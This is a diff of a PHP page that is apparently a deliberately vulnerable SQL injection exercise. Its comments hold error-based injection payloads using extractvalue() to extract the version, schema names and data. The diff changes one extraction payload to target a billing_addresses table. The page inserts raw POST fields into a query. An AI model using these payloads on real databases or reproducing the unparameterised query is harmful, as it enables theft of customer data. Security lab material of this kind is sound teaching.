@@ -2,13 +2,6 @@
 include('config.php');
 include('waf.php');
 
-// Coded by Versailles - viloid - cans21
-// Sec7or Team - Surabaya HackerLink
-// Simple SQL injection in POST Method - in insert ( Error Based )
-
-// Query injection -------
-// 'and extractvalue(0,concat(0x3a, [QUERY])),'
-
 // GET VERSION 
 // 'and extractvalue(0,concat(0x3a, verion())),'
 
@@ -19,7 +12,7 @@ include('waf.php');
 // 'and extractvalue(0,concat(0x3a, (select column_name from information_schema.columns where table_name='gath39' limit 0,1))),'
 
 // DUMP DATA
-// 'and extractvalue(0,concat(0x3a,(select title from gath39 limit 0,1))),'
+// (select first_name from billing_addresses limit 0,1)
 
 // TEXT TUTORIAL
 // https://www.facebook.com/notes/verry-darmawan/error-based/2305245552873650/
@@ -46,7 +39,7 @@ if(isset($_POST['submit'])){
 	$image = $_POST['image'];
 	$quote = $_POST['quote'];
 	
-    $query = "INSERT INTO shl.gath39 VALUES ('', '$title', '$image', '$quote')";
+    $query = "INSERT INTO gath39.article VALUES ('', '$title', '$image', '$quote')";
     $result = mysqli_query($con,$query);
         
     if($result){
